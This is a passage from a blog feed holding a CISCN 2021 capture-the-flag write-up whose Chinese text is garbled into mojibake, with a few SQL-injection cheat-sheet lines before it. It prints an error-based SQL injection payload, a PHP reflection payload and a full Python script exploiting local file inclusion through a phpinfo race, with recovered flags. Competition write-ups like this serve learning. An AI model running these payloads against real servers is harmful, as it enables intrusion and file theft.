Serverå­—ç¬¦ä¸²è¿æ¥ã€‚å¦‚æœæˆåŠŸï¼Œå°†è¿”å›ä¸æ°¸çœŸæ¡ä»¶ç›¸åŒçš„ä¿¡æ¯</td></tr><tr><td>1â€™ or â€˜abâ€™=â€™aâ€™ â€˜b</td><td>1â€™) or (â€˜abâ€™=â€™aâ€™ â€˜b</td><td>MySQLå­—ç¬¦ä¸²è¿æ¥ã€‚å¦‚æœæˆåŠŸï¼Œå°†è¿”å›ä¸æ°¸çœŸæ¡ä»¶ç›¸åŒçš„ä¿¡æ¯</td></tr><tr><td>1â€™ or â€˜abâ€™=â€™aâ€™â€–â€™b</td><td>1â€™) or (â€˜abâ€™=â€™aâ€™â€–â€™b</td><td>Oracleå­—ç¬¦ä¸²è¿æ¥ã€‚å¦‚æœæˆåŠŸï¼Œå°†è¿”å›ä¸æ°¸çœŸæ¡ä»¶ç›¸åŒçš„ä¿¡æ¯</td></tr></tbody></table><h2 id="ç§»ä½æº¢æ³¨"><a href="#ç§»ä½æº¢æ³¨" class="headerlink" title="ç§»ä½æº¢æ³¨"></a>ç§»ä½æº¢æ³¨</h2><p>çŸ¥é“è¡¨åä¸éœ€è¦çŸ¥é“å­—æ®µåï¼Œä¸€èˆ¬æ²¡ç”¨ï¼Œèƒ½ç”¨çš„æ—¶å€™éƒ½èƒ½ç”¨å…¶ä»–çš„æ³¨å‡ºæ¥ã€‚</p><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;

&lt;h1 id=&quot;SQLæ³¨å…¥&quot;&gt;&lt;a href=&quot;#SQLæ³¨å…¥&quot; class=&quot;headerlink&quot; title=&quot;SQLæ³¨å…¥&quot;&gt;&lt;/a&gt;SQLæ³¨å…¥&lt;/h1&gt;&lt;p&gt;å°äº¤æµä¼šçš„æçº²ï¼Œè®°å½•ä¸‹ï¼Œæ²¡æœ‰é€»è¾‘å¯è¨€&lt;/p&gt;
&lt;p&gt;ä»Šå¹´æœ¬äººå‚åŠ çš„CTFä¸­è®°å½•</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>2021CISCN-WP</title>
    <link href="https://err0r.top/article/ciscn2021/"/>
    <id>https://err0r.top/article/ciscn2021/</id>
    <published>2021-05-17T06:33:44.000Z</published>
    <updated>2021-05-17T07:22:14.606Z</updated>
    
    <content type="html"><![CDATA[<p>Ciscn 2021</p><p>é˜Ÿä¼åç§°ï¼šS3C_2021</p><a id="more"></a><h2 id="é˜Ÿä¼æƒ…å†µ"><a href="#é˜Ÿä¼æƒ…å†µ" class="headerlink" title="é˜Ÿä¼æƒ…å†µ"></a>é˜Ÿä¼æƒ…å†µ</h2><p><del>æœ¬èœé¸¡å¤ªèœï¼Œä¸å€¼ä¸€æï¼Œå¸Œæœ›åˆ†åŒºèµ›èƒ½å†²åˆºï¼Œäº‰å–è¿›å…¥æ€»å†³èµ›(åˆ äº†)</del></p><hr><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy_sql"></a>easy_sql</h3><p>sqlæ³¨å…¥ï¼Œsqlmapè·‘</p><img src="/article/ciscn2021/image-20210515121550955.png" class="" title="image-20210515121550955" loading="lazy"><p>æ ¹æ®logå¾—çŸ¥åº“åsecurity</p><img src="/article/ciscn2021/image-20210515121644530.png" class="" title="image-20210515121644530" loading="lazy"><p>è¡¨åusersï¼Œflag</p><img src="/article/ciscn2021/image-20210515121704337.png" class="" title="image-20210515121704337" loading="lazy"><p>payloadï¼š</p><pre class="language-sql" data-language="sql"><code class="language-sql">uname<span class="token operator">=</span>'<span class="token punctuation">)</span><span class="token operator">+</span><span class="token operator">AND</span><span class="token operator">+</span>EXTRACTVALUE<span class="token punctuation">(</span><span class="token number">4078</span><span class="token punctuation">,</span>CONCAT<span class="token punctuation">(</span><span class="token number">0x5c</span><span class="token punctuation">,</span><span class="token number">0x717a7a7671</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token operator">+</span><span class="token operator">*</span><span class="token operator">+</span><span class="token keyword">from</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token operator">+</span><span class="token operator">*</span><span class="token operator">+</span><span class="token keyword">from</span><span class="token operator">+</span>flag<span class="token operator">+</span><span class="token keyword">as</span><span class="token operator">+</span>a<span class="token operator">+</span><span class="token keyword">join</span><span class="token operator">+</span>flag<span class="token operator">+</span><span class="token keyword">as</span><span class="token operator">+</span>b<span class="token operator">+</span><span class="token keyword">using</span><span class="token punctuation">(</span><span class="token keyword">no</span><span class="token punctuation">,</span>id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token keyword">as</span><span class="token operator">+</span>c<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x717a6a7871</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">--+&amp;passwd=1&amp;Submit=%E7%99%BB%E5%BD%95</span></code></pre><p>åŒè¡¨æŸ¥è¯¢å¾—åˆ°åˆ—åid,no,200e6beb-a706-473f-add2-29e877c6ce25</p><p>æœ€ç»ˆ</p><img src="/article/ciscn2021/1.jpg" class="" title="2ED72E0CF8ED07FBCB27F11F73A6187B" loading="lazy"><p>Flag:</p><pre class="language-none"><code class="language-none">CISCN&#123;63zs0-zMP27-bhZDu-kIEv3-AvlHh-&#125;</code></pre><hr><h3 id="easy-source"><a href="#easy-source" class="headerlink" title="easy_source"></a>easy_source</h3><p>åŸé¢˜ï¼š<a href="https://r0yanx.com/2020/10/28/fslh-writeup/">https://r0yanx.com/2020/10/28/fslh-writeup/</a></p><p>æ‰«ç›®å½•å‘ç°<code>.index.php.swo</code></p><p>å¯ä»¥åˆ©ç”¨ PHP å†…ç½®ç±»ä¸­çš„ <code>ReflectionMethod</code> æ¥è¯»å– <code>User</code> ç±»é‡Œé¢å„ä¸ªå‡½æ•°çš„æ³¨é‡Š</p><p>payloadï¼š</p><pre class="language-none"><code class="language-none">.&#x2F;?rc&#x3D;ReflectionMethod&amp;ra&#x3D;User&amp;rb&#x3D;q&amp;rd&#x3D;getDocComment</code></pre><img src="/article/ciscn2021/image-20210515124614970.png" class="" title="image-20210515124614970" loading="lazy"><p>Flag:</p><pre class="language-none"><code class="language-none">CISCN&#123;Ak4Z6-6GU0a-fAz0n-OTdYy-KDq4Q-&#125;</code></pre><hr><h3 id="middle-source"><a href="#middle-source" class="headerlink" title="middle_source"></a>middle_source</h3><p>æ‰«ç›®å½•å‘ç°<code>.listing</code></p><p>è®¿é—®å¾—åˆ°<code>you_can_seeeeeeee_me.php</code>ï¼Œç»™äº†phpinfo</p><p>æ ¹æ®æºç å‘ç°</p><p><code>$_POST[&quot;field&quot;];</code>å’Œ<code>echo $$field;</code>æœ‰å‡ºå…¥</p><p>æ ¹æ®vulhubä¸€ä¸ªåˆ©ç”¨phpinfoè¿›è¡Œæ–‡ä»¶åŒ…å«çš„æ¼æ´ï¼Œæ”¹ä¸€ä¸‹expç›´æ¥æ‰“</p><p><a href="https://github.com/vulhub/vulhub/blob/master/php/inclusion/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/php/inclusion/README.zh-cn.md</a></p><p>exp:</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token keyword">import</span> threading<span class="token keyword">import</span> socket<span class="token keyword">def</span> <span class="token function">setup</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">:</span>    TAG<span class="token operator">=</span><span class="token string">"Security Test"</span>    <span class="token comment"># PAYLOAD = """%s\r</span>    <span class="token comment"># &lt;?php var_dump(scandir('/etc/ceffgbbgcd/chffbdjbag/cjdieddjcc/cajjfieifd/ajdfdccjdj/'));?>\r""" % TAG</span>    PAYLOAD<span class="token operator">=</span><span class="token triple-quoted-string string">"""%s\r&lt;?php var_dump(file_get_contents('/etc/ceffgbbgcd/chffbdjbag/cjdieddjcc/cajjfieifd/ajdfdccjdj/fl444444g'));?>\r"""</span> <span class="token operator">%</span> TAG    REQ1_DATA<span class="token operator">=</span><span class="token triple-quoted-string string">"""-----------------------------7dbff1ded0714\rContent-Disposition: form-data; name="123"; filename="test.txt"\rContent-Type: text/plain\r\r%s-----------------------------7dbff1ded0714"""</span> <span class="token operator">%</span> PAYLOAD    padding<span class="token operator">=</span><span class="token string">"G"</span> <span class="token operator">*</span> <span class="token number">5000</span>    REQ1<span class="token operator">=</span><span class="token triple-quoted-string string">"""POST /?a="""</span><span class="token operator">+</span>padding<span class="token operator">+</span><span class="token triple-quoted-string string">""" HTTP/1.1\rCookie: PHPSESSID=1; othercookie="""</span><span class="token operator">+</span>padding<span class="token operator">+</span><span class="token triple-quoted-string string">"""\rHTTP_ACCEPT: """</span> <span class="token operator">+</span> padding <span class="token operator">+</span> <span class="token triple-quoted-string string">"""\rHTTP_USER_AGENT: """</span><span class="token operator">+</span>padding<span class="token operator">+</span><span class="token triple-quoted-string string">"""\rHTTP_ACCEPT_LANGUAGE: """</span><span class="token operator">+</span>padding<span class="token operator">+</span><span class="token triple-quoted-string string">"""\rHTTP_PRAGMA: """</span><span class="token operator">+</span>padding<span class="token operator">+</span><span class="token triple-quoted-string string">"""\rContent-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\rContent-Length: %s\rHost: %s\r\r%s"""</span> <span class="token operator">%</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>REQ1_DATA<span class="token punctuation">)</span><span class="token punctuation">,</span>host<span class="token punctuation">,</span>REQ1_DATA<span class="token punctuation">)</span>    <span class="token comment">#modify this to suit the LFI script  </span>    LFIREQ<span class="token operator">=</span><span class="token triple-quoted-string string">"""POST / HTTP/1.1\rUser-Agent: Mozilla/4.0\rProxy-Connection: Keep-Alive\rHost: %s\rContent-Type: application/x-www-form-urlencodedContent-Length: %s\r\r%s"""</span>    <span class="token comment">#print(REQ1)</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>REQ1<span class="token punctuation">,</span> TAG<span class="token punctuation">,</span> LFIREQ<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">phpInfoLFI</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> phpinforeq<span class="token punctuation">,</span> offset<span class="token punctuation">,</span> lfireq<span class="token punctuation">,</span> tag<span class="token punctuation">)</span><span class="token punctuation">:</span>    s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>    s2 <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>    s2<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>phpinforeq<span class="token punctuation">)</span>    d <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">while</span> <span class="token builtin">len</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span> <span class="token operator">&lt;</span> offset<span class="token punctuation">:</span>        d <span class="token operator">+=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>offset<span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        i <span class="token operator">=</span> d<span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token string">"[tmp_name] =&amp;gt; "</span><span class="token punctuation">)</span>        fn <span class="token operator">=</span> d<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">17</span><span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">31</span><span class="token punctuation">]</span>    <span class="token keyword">except</span> ValueError<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">None</span>    fn<span class="token operator">=</span><span class="token string">"cf=../../../../../..&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>fn<span class="token punctuation">)</span>    <span class="token comment">#print(fn)</span>    s2<span class="token punctuation">.</span>send<span class="token punctuation">(</span>lfireq <span class="token operator">%</span> <span class="token punctuation">(</span>host<span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>fn<span class="token punctuation">)</span><span class="token punctuation">,</span>fn<span class="token punctuation">)</span><span class="token punctuation">)</span>    d <span class="token operator">=</span> s2<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    s2<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> d<span class="token punctuation">.</span>find<span class="token punctuation">(</span>tag<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span>        <span class="token keyword">return</span> fncounter<span class="token operator">=</span><span class="token number">0</span><span class="token keyword">class</span> <span class="token class-name">ThreadWorker</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> e<span class="token punctuation">,</span> l<span class="token punctuation">,</span> m<span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>event <span class="token operator">=</span> e        self<span class="token punctuation">.</span>lock <span class="token operator">=</span>  l        self<span class="token punctuation">.</span>maxattempts <span class="token operator">=</span> m        self<span class="token punctuation">.</span>args <span class="token operator">=</span> args    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">global</span> counter        <span class="token keyword">while</span> <span class="token keyword">not</span> self<span class="token punctuation">.</span>event<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">with</span> self<span class="token punctuation">.</span>lock<span class="token punctuation">:</span>                <span class="token keyword">if</span> counter <span class="token operator">>=</span> self<span class="token punctuation">.</span>maxattempts<span class="token punctuation">:</span>                    <span class="token keyword">return</span>                counter<span class="token operator">+=</span><span class="token number">1</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                x <span class="token operator">=</span> phpInfoLFI<span class="token punctuation">(</span><span class="token operator">*</span>self<span class="token punctuation">.</span>args<span class="token punctuation">)</span>                <span class="token keyword">if</span> self<span class="token punctuation">.</span>event<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">break</span>                                <span class="token keyword">if</span> x<span class="token punctuation">:</span>                    <span class="token keyword">print</span> <span class="token string">"\nGot it!"</span>                    self<span class="token punctuation">.</span>event<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                                <span class="token keyword">except</span> socket<span class="token punctuation">.</span>error<span class="token punctuation">:</span>                <span class="token keyword">return</span>    <span class="token keyword">def</span> <span class="token function">getOffset</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> phpinforeq<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Gets offset of tmp_name in the php output"""</span>    s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>phpinforeq<span class="token punctuation">)</span>        d <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        i <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span>        d<span class="token operator">+=</span>i                <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>        <span class="token comment"># detect the final chunk</span>        <span class="token keyword">if</span> i<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">"0\r\n\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>    s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    i <span class="token operator">=</span> d<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"[tmp_name] =&amp;gt; "</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token string">"No php tmp_name in phpinfo output"</span><span class="token punctuation">)</span>        <span class="token keyword">print</span> <span class="token string">"found %s at %i"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>d<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">,</span>i<span class="token punctuation">)</span>    <span class="token comment"># padded up a bit</span>    <span class="token keyword">return</span> i<span class="token operator">+</span><span class="token number">256</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"LFI With PHPInfo()"</span>    <span class="token keyword">print</span> <span class="token string">"-="</span> <span class="token operator">*</span> <span class="token number">30</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"Usage: %s host [port] [threads]"</span> <span class="token operator">%</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        host <span class="token operator">=</span> socket<span class="token punctuation">.</span>gethostbyname<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> socket<span class="token punctuation">.</span>error<span class="token punctuation">,</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"Error with hostname %s: %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span>        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    port<span class="token operator">=</span><span class="token number">80</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        port <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> IndexError<span class="token punctuation">:</span>        <span class="token keyword">pass</span>    <span class="token keyword">except</span> ValueError<span class="token punctuation">,</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"Error with port %d: %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span>        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>        poolsz<span class="token operator">=</span><span class="token number">10</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        poolsz <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> IndexError<span class="token punctuation">:</span>        <span class="token keyword">pass</span>    <span class="token keyword">except</span> ValueError<span class="token punctuation">,</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"Error with poolsz %d: %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span>        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"Getting initial offset..."</span><span class="token punctuation">,</span>      reqphp<span class="token punctuation">,</span> tag<span class="token punctuation">,</span> reqlfi <span class="token operator">=</span> setup<span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span>    offset <span class="token operator">=</span> getOffset<span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> reqphp<span class="token punctuation">)</span>    sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>    maxattempts <span class="token operator">=</span> <span class="token number">1000</span>    e <span class="token operator">=</span> threading<span class="token punctuation">.</span>Event<span class="token punctuation">(</span><span class="token punctuation">)</span>    l <span class="token operator">=</span> threading<span class="token punctuation">.</span>Lock<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"Spawning worker pool (%d)..."</span> <span class="token operator">%</span> poolsz    sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>    tp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>poolsz<span class="token punctuation">)</span><span class="token punctuation">:</span>        tp<span class="token punctuation">.</span>append<span class="token punctuation">(</span>ThreadWorker<span class="token punctuation">(</span>e<span class="token punctuation">,</span>l<span class="token punctuation">,</span>maxattempts<span class="token punctuation">,</span> host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> reqphp<span class="token punctuation">,</span> offset<span class="token punctuation">,</span> reqlfi<span class="token punctuation">,</span> tag<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> t <span class="token keyword">in</span> tp<span class="token punctuation">:</span>        t<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">while</span> <span class="token keyword">not</span> e<span class="token punctuation">.</span>wait<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> e<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">break</span>            <span class="token keyword">with</span> l<span class="token punctuation">:</span>                sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span> <span class="token string">"\r% 4d / % 4d"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>counter<span class="token punctuation">,</span> maxattempts<span class="token punctuation">)</span><span class="token punctuation">)</span>                sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> counter <span class="token operator">>=</span> maxattempts<span class="token punctuation">:</span>                    <span class="token keyword">break</span>        <span class="token keyword">print</span>        <span class="token keyword">if</span> e<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span> <span class="token string">"Woot!  \m/"</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span> <span class="token string">":("</span>    <span class="token keyword">except</span> KeyboardInterrupt<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"\nTelling threads to shutdown..."</span>        e<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span> <span class="token string">"Shuttin' down..."</span>    <span class="token keyword">for</span> t <span class="token keyword">in</span> tp<span class="token punctuation">:</span>        t<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>è·‘å‡ºç»“æœ</p><img src="/article/ciscn2021/image-20210515181707458.png" class="" title="image-20210515181707458" loading="lazy"><img src="/article/ciscn2021/image-20210515182132566.png" class="" title="image-20210515182132566" loading="lazy"><img src="/article/ciscn2021/image-20210515182141809.png" class="" title="image-20210515182141809" loading="lazy"><img src="/article/ciscn2021/image-20210515182239294.png" class="" title="image-20210515182239294" loading="lazy"><img src="/article/ciscn2021/image-20210515182330338.png" class="" title="image-20210515182330338" loading="lazy"><img src="/article/ciscn2021/image-20210515182410646.png" class="" title="image-20210515182410646" loading="lazy"><img src="/article/ciscn2021/image-20210515183203380.png" class="" title="image-20210515183203380" loading="lazy"><p>flagä½ç½®ï¼š<code>/etc/ceffgbbgcd/chffbdjbag/cjdieddjcc/cajjfieifd/ajdfdccjdj/fl444444g</code></p><p>Flag:</p><pre class="language-none"><code class="language-none">CISCN&#123;BmLDI-8WFso-KZGN9-XObp3-sjSOf-&#125;</code></pre><hr><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="tiny-traffic"><a href="#tiny-traffic" class="headerlink" title="tiny traffic"></a>tiny traffic</h3><p>æµé‡åŒ…åˆ†æ</p><img src="/article/ciscn2021/9CFC275D-3F65-48C5-A8BE-F9B67DDD610D.png" class="" title="9CFC275D-3F65-48C5-A8BE-F9B67DDD610D" loading="lazy"><p>å‘ç°ä¸‰ä¸ªå…³é”®éƒ¨åˆ†</p><p>å…¨éƒ¨å¯¼å‡ºçœ‹çœ‹ï¼Œè§£å‹<code>flag_wrapper</code>å¾—åˆ°<code>CISCN&#123;&#125;</code></p><img src="/article/ciscn2021/image-20210516043809208.png" class="" title="image-20210516043809208" loading="lazy"><p>åˆ©ç”¨è„šæœ¬è§£brå‘ç°proto3å†…å®¹</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># coding=utf-8</span><span class="token keyword">import</span> brotli<span class="token builtin">file</span> <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"./test.br"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span><span class="token punctuation">)</span>content <span class="token operator">=</span> brotli<span class="token punctuation">.</span>decompress<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">,</span><span class="token string">"bw"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>content<span class="token punctuation">)</span></code></pre><img src="/article/ciscn2021/image-20210516052103002.png" class="" title="image-20210516052103002" loading="lazy"><p>å¯¼å‡º<code>secret</code>å†…å®¹å¦‚ä¸‹</p><img src="/article/ciscn2021/image-20210516052229144.png" class="" title="image-20210516052229144" loading="lazy"><p>ç”±æ­¤åº”è¯¥æ˜¯ç”¨proto3åè®®æ¥è§£å¯†</p><p>æ ¹æ®æ•™ç¨‹<a href="https://www.cnblogs.com/luoxn28/p/5303517.html">https://www.cnblogs.com/luoxn28/p/5303517.html</a></p><p>å®‰è£…ç¯å¢ƒåç”¨å…¶è‡ªå¸¦çš„decodeæ–¹æ³•ï¼Œç”¨testæ–‡ä»¶è§„å®šçš„è§£å¯†è§„åˆ™å°†å¤„ç†è¿‡çš„<code>secret</code>è¿›è¡Œè§£å¯†</p><img src="/article/ciscn2021/image-20210516054849721.png" class="" title="image-20210516054849721" loading="lazy"><p>æœ‰ç”¨çš„éƒ¨åˆ†åœ¨<code>PBResponse</code></p><p>æœ€åæ‹¼æ¥flag</p><pre class="language-python" data-language="python"><code 